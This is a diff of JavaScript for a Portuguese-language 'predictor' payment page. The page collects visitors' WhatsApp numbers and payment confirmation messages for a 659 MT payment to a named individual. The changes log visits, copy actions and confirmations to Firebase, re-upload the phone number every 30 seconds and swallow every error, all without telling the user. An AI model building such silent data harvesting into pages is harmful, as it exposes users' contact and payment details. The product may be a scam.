+      }).catch(error => {
+        console.warn('⚠️ Firebase offline mode');
+        firebaseReady = false;
+      });
+      
     } catch (error) {
-      console.warn('⚠️ Firebase não disponível');
-      firebaseAvailable = false;
+      console.error('❌ Erro Firebase:', error);
+      firebaseReady = false;
     }
+  }
+
+  // ==================== REGISTRAR VISITA ====================
+  function registerSiteVisit() {
+    if (!firebaseReady || !db) return;
+    try {
+      db.collection('payment_site_visits').add({
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        sessionId: currentSessionId,
+        userAgent: navigator.userAgent,
+        pageType: 'predictor_payment_page',
+        paymentAmount: '659 MT'
+      }).catch(() => {});
+    } catch (error) {}
   }
 
   // ==================== REGISTRAR AÇÃO ====================
   function registerUserAction(action, details = {}) {
-    if (!firebaseAvailable) return;
+    if (!firebaseReady || !db) return;
     try {
-      firebase.firestore().collection('user_actions').add({
+      db.collection('user_actions').add({
         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
         sessionId: currentSessionId,
         action: action,
-        ...details,
-        userAgent: navigator.userAgent
-      });
+        ...details
+      }).catch(() => {});
     } catch (error) {}
   }
 
-  // ==================== INICIALIZAÇÃO ====================
-  document.addEventListener('DOMContentLoaded', function() {
-    initializeFirebase();
-    registerUserAction('page_load', { pageType: 'payment_page' });
-    
-    const saved = localStorage.getItem(STORAGE_KEY_WHATSAPP);
-    if (saved) {
-      whatsappInput.value = formatPhoneNumber(saved);
-      validateWhatsappNumber(true);
-    }
-    
-    whatsappInput.addEventListener('input', function() {
-      let value = this.value.replace(/\D/g, '');
-      if (value.length > 9) value = value.substring(0, 9);
-      this.value = formatPhoneNumber(value);
-      validateWhatsappNumber();
-    });
-    
-    transactionMessageInput.addEventListener('input', function() {
-      const length = this.value.length;
-      charCount.textContent = `${length}/100 caracteres mínimos`;
-      if (length >= 100) {
-        charCount.style.color = '#00C853';
-      } else {
-        charCount.style.color = '#FF3D00';
-      }
-      validateConfirmationForm();
-    });
-    
-    setTimeout(() => whatsappInput.focus(), 300);
-  });
+  // ==================== SALVAR WHATSAPP ====================
+  function saveWhatsappToFirebase(phoneNumber) {
+    if (!firebaseReady || !db) return;
+    try {
+      db.collection('whatsapp_numbers').add({
+        phoneNumber: phoneNumber,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        sessionId: currentSessionId,
+        status: 'pending',
+        amount: '659 MT'
+      }).catch(() => {});
+    } catch (error) {}
+  }
 
+  // ==================== SALVAR CONFIRMAÇÃO ====================
+  async function saveConfirmationToFirebase(paymentData) {
+    if (!firebaseReady || !db) return false;
+    try {
+      await db.collection('payment_confirmations').add({
+        ...paymentData,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+      return true;
+    } catch (error) {
+      return false;
+    }
+  }
+
+  // ==================== FORMATAR NÚMERO ====================
   function formatPhoneNumber(number) {
     if (!number) return '';
     const cleaned = number.replace(/\D/g, '');
     const match = cleaned.match(/^(\d{2})(\d{3})(\d{0,4})$/);
-    if (match) {
-      return match[1] + ' ' + match[2] + (match[3] ? ' ' + match[3] : '');
-    }
+    if (match) return match[1] + ' ' + match[2] + (match[3] ? ' ' + match[3] : '');
     return cleaned;
   }
 
+  // ==================== SALVAR LOCAL ====================
   function saveToLocalStorage(phoneNumber) {
     try {
       localStorage.setItem(STORAGE_KEY_WHATSAPP, phoneNumber);
-      const logs = JSON.parse(localStorage.getItem(STORAGE_KEY_LOGS) || '[]');
-      logs.push({ phoneNumber, timestamp: new Date().toISOString(), sessionId: currentSessionId });
-      if (logs.length > 50) logs.splice(0, logs.length - 50);
-      localStorage.setItem(STORAGE_KEY_LOGS, JSON.stringify(logs));
     } catch (error) {}
   }
 
+  // ==================== VALIDAR WHATSAPP ====================
   function validateWhatsappNumber(save = false) {
     const rawNumber = whatsappInput.value.replace(/\s/g, '');
     successMessage.style.display = 'none';
@@ -1624,20 +1376,15 @@
     currentWhatsappNumber = rawNumber;
     isWhatsappValid = true;
     saveToLocalStorage(rawNumber);
-    registerUserAction('whatsapp_validated', { phoneNumber: rawNumber });
+    
+    if (save) {
+      saveWhatsappToFirebase(rawNumber);
+      registerUserAction('whatsapp_validated', { phoneNumber: rawNumber });
+    }
+    
     updateCopyButtons();
     validateConfirmationForm();
     successMessage.style.display = 'block';
-    
-    if (save && firebaseAvailable) {
-      try {
-        firebase.firestore().collection('whatsapp_numbers').add({
-          phoneNumber: rawNumber,
-          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-          sessionId: currentSessionId
-        });
-      } catch (error) {}
-    }
     return true;
   }
 
@@ -1649,7 +1396,6 @@
   function showError(message) {
     errorText.textContent = message;
     errorMessage.style.display = 'block';
-    successMessage.style.display = 'none';
     whatsappInput.classList.add('shake');
     setTimeout(() => whatsappInput.classList.remove('shake'), 500);
   }
@@ -1669,9 +1415,12 @@
     spinner.classList.remove('hidden');
     button.disabled = true;
     
+    registerUserAction('copy_started', { method, number });
+    
     try {
       await navigator.clipboard.writeText(number);
       showToast(`✅ ${method} copiado! Nome: LUCAS JOSÉ`, 'success');
+      registerUserAction('copy_success', { method });
       btnText.textContent = 'COPIADO!';
       button.classList.add('copied');
       spinner.classList.add('hidden');
@@ -1681,17 +1430,13 @@
         button.disabled = false;
       }, 1500);
     } catch (error) {
-      try {
-        const tempInput = document.createElement('input');
-        tempInput.value = number;
-        document.body.appendChild(tempInput);
-        tempInput.select();
-        document.execCommand('copy');
-        document.body.removeChild(tempInput);
-        showToast(`✅ ${method} copiado!`, 'success');
-      } catch (fallbackError) {
-        showToast('❌ Erro ao copiar', 'error');
-      }
+      const tempInput = document.createElement('input');
+      tempInput.value = number;
+      document.body.appendChild(tempInput);
+      tempInput.select();
+      document.execCommand('copy');
+      document.body.removeChild(tempInput);
+      showToast(`✅ ${method} copiado!`, 'success');
       btnText.textContent = originalText;
       spinner.classList.add('hidden');
       button.disabled = false;
@@ -1702,7 +1447,7 @@
     selectedPaymentMethod = method;
     selectedMethodInput.value = method;
     registerUserAction('payment_method_selected', { method });
-    document.querySelectorAll('.method-option').forEach(option => option.classList.remove('selected'));
+    document.querySelectorAll('.method-option').forEach(opt => opt.classList.remove('selected'));
     document.getElementById(`method${method.charAt(0).toUpperCase() + method.slice(1)}`).classList.add('selected');
     updateMethodCheck();
     validateConfirmationForm();
@@ -1732,12 +1477,9 @@
     const message = transactionMessageInput.value.trim();
     const hasValidMessage = message.length >= 100;
     const hasMethod = selectedPaymentMethod !== '';
-    const hasWhatsapp = isWhatsappValid;
-    
     updateMethodCheck();
     updateMessageCheck(hasValidMessage);
-    
-    submitPaymentBtn.disabled = !(hasWhatsapp && hasMethod && hasValidMessage);
+    submitPaymentBtn.disabled = !(isWhatsappValid && hasMethod && hasValidMessage);
     return !submitPaymentBtn.disabled;
   }
 
@@ -1747,12 +1489,10 @@
       whatsappInput.focus();
       return;
     }
-    
     if (!selectedPaymentMethod) {
       showToast('Selecione o método de pagamento!', 'error');
       return;
     }
-    
     const message = transactionMessageInput.value.trim();
     if (message.length < 100) {
       showToast('Informe a mensagem de confirmação (100+ caracteres)!', 'error');
@@ -1761,54 +1501,46 @@
     
     const btnText = submitPaymentBtn.querySelector('.btn-text');
     const spinner = submitPaymentBtn.querySelector('.spinner');
-    const originalText = btnText.textContent;
-    
     btnText.textContent = 'ENVIANDO...';
     spinner.classList.remove('hidden');
     submitPaymentBtn.disabled = true;
     
     try {
       let extractedTransactionId = 'Não identificado';
-      const idPatterns = [/ID[:\s]*([A-Z0-9]{8,})/i, /Referência[:\s]*([A-Z0-9]{8,})/i, /([0-9]{10,})/];
-      for (const pattern of idPatterns) {
+      const patterns = [/ID[:\s]*([A-Z0-9]{8,})/i, /Referência[:\s]*([A-Z0-9]{8,})/i, /([0-9]{10,})/];
+      for (const pattern of patterns) {
         const match = message.match(pattern);
-        if (match && match[1]) {
-          extractedTransactionId = match[1];
-          break;
-        }
+        if (match && match[1]) { extractedTransactionId = match[1]; break; }
       }
-      if (extractedTransactionId === 'Não identificado') {
-        extractedTransactionId = message.substring(0, 20) + '...';
-      }
+      if (extractedTransactionId === 'Não identificado') extractedTransactionId = message.substring(0, 20) + '...';
       
       const paymentData = {
         whatsappNumber: currentWhatsappNumber,
         paymentMethod: selectedPaymentMethod,
         transactionMessage: message,
         transactionId: extractedTransactionId,
-        timestamp: new Date().toISOString(),
-        sessionId: currentSessionId
+        sessionId: currentSessionId,
+        amount: '659 MT'
       };
       
+      // Salvar localmente
       const payments = JSON.parse(localStorage.getItem(STORAGE_KEY_PAYMENTS) || '[]');
-      payments.push(paymentData);
+      payments.push({ ...paymentData, timestamp: new Date().toISOString() });
       if (payments.length > 20) payments.splice(0, payments.length - 20);
       localStorage.setItem(STORAGE_KEY_PAYMENTS, JSON.stringify(payments));
       
-      if (firebaseAvailable) {
-        await firebase.firestore().collection('payment_confirmations').add({
-          ...paymentData,
-          timestamp: firebase.firestore.FieldValue.serverTimestamp()
-        });
-      }
+      // Salvar no Firebase
+      await saveConfirmationToFirebase(paymentData);
+      registerUserAction('confirmation_submitted', { method: selectedPaymentMethod, transactionId: extractedTransactionId });
       
       showConfirmationModal(paymentData);
       resetConfirmationForm();
+      showToast('✅ Confirmação enviada com sucesso!', 'success');
       
     } catch (error) {
       showToast('Erro ao enviar confirmação!', 'error');
     } finally {
-      btnText.textContent = originalText;
+      btnText.textContent = 'ENVIAR CONFIRMAÇÃO';
       spinner.classList.add('hidden');
       submitPaymentBtn.disabled = false;
     }
@@ -1827,7 +1559,7 @@
   }
 
   function resetConfirmationForm() {
-    document.querySelectorAll('.method-option').forEach(option => option.classList.remove('selected'));
+    document.querySelectorAll('.method-option').forEach(opt => opt.classList.remove('selected'));
     selectedPaymentMethod = '';
     selectedMethodInput.value = '';
     transactionMessageInput.value = '';
@@ -1856,16 +1588,44 @@
     toastMessage.textContent = message;
     toastIcon.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
     toast.style.borderLeftColor = type === 'success' ? '#00C853' : '#FF3D00';
-    toastIcon.style.color = type === 'success' ? '#00C853' : '#FF3D00';
     toast.style.display = 'block';
     setTimeout(() => toast.style.display = 'none', 3000);
   }
 
-  setInterval(() => {
-    if (isWhatsappValid && currentWhatsappNumber) {
-      saveToLocalStorage(currentWhatsappNumber);
+  // ==================== INICIALIZAÇÃO ====================
+  document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 Iniciando aplicação...');
+    initializeFirebase();
+    
+    const saved = localStorage.getItem(STORAGE_KEY_WHATSAPP);
+    if (saved) {
+      whatsappInput.value = formatPhoneNumber(saved);
+      validateWhatsappNumber(true);
     }
-  }, 30000);
+    
+    whatsappInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 9) value = value.substring(0, 9);
+      this.value = formatPhoneNumber(value);
+      validateWhatsappNumber();
+    });
+    
+    transactionMessageInput.addEventListener('input', function() {
+      const length = this.value.length;
+      charCount.textContent = `${length}/100 caracteres mínimos`;
+      if (length >= 100) charCount.style.color = '#00C853';
+      else charCount.style.color = '#FF3D00';
+      validateConfirmationForm();
+    });
+    
+    setTimeout(() => whatsappInput.focus(), 300);
+    
+    setInterval(() => {
+      if (isWhatsappValid && currentWhatsappNumber) {
+        saveWhatsappToFirebase(currentWhatsappNumber);
+      }
+    }, 30000);
+  });
 
   document.addEventListener('submit', e => e.preventDefault());
 </script>
